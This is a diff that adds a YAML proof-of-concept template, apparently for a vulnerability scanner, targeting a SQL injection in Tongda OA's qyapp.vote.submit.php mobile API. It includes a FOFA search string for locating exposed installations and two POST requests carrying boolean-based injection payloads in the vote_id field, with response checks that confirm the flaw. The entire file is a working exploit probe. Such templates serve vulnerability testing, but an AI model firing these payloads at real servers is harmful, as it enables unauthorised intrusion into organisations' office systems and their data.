@@ -1,0 +1,24 @@
+id: poc-yaml-tongda-oa-submit-sqli
+info:
+  name: 通达OA qyapp.vote.submit.php接口存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: POST
+  path: /mobile/api/qyapp.vote.submit.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: submitData={"a":{"vote_type":"1","vote_id":"if((select%20length((select%20123))=1),1,2*1e308)","value":"1"}}
+  expression: "status_code == 200 && \n(contains(gbk_decode(body),\"请联系管理员\") || contains(body,\"\
+    请联系管理员\"))\n"
+- method: POST
+  path: /mobile/api/qyapp.vote.submit.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: submitData={"a":{"vote_type":"1","vote_id":"if((select%20length((select%20123))=3),1,2*1e308)","value":"1"}}
+  expression: "status_code == 200 && \nbody == \"\"\n"
+variables: {}
+transport: http
